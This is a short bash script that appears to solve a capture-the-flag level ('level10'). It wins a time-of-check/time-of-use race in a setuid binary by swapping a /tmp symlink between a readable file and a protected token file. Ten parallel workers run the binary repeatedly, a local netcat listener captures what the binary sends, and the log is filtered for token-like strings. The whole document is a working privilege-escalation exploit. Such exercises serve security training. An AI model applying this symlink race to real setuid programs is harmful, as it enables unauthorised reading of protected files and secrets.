#!/bin/bash
TARGET=/home/user/level10/token
LEGIT=/home/user/level10/level10
LINK=/tmp/race
WORKERS=10
ATTEMPTS=20000

pkill -f "nc -lk 6969" 2>/dev/null
rm -f log

nc -lk 6969 > log &
NC_PID=$!

while true; do
    ln -sf "$LEGIT" "$LINK"
    ln -sf "$TARGET" "$LINK"
done &
RACER=$!

run() {
    for i in $(seq "$ATTEMPTS"); do
        /home/user/level10/./level10 "$LINK" 127.0.0.1 >/dev/null 2>&1
    done
}

WORKER_PIDS=()
for w in $(seq "$WORKERS"); do
    run &
    WORKER_PIDS+=($!)
done

wait "${WORKER_PIDS[@]}"

kill "$RACER" "$NC_PID" 2>/dev/null

echo "=== candidats token (chaînes courtes imprimables) ==="
strings log | grep -E '^[[:alnum:]]{10,40}$'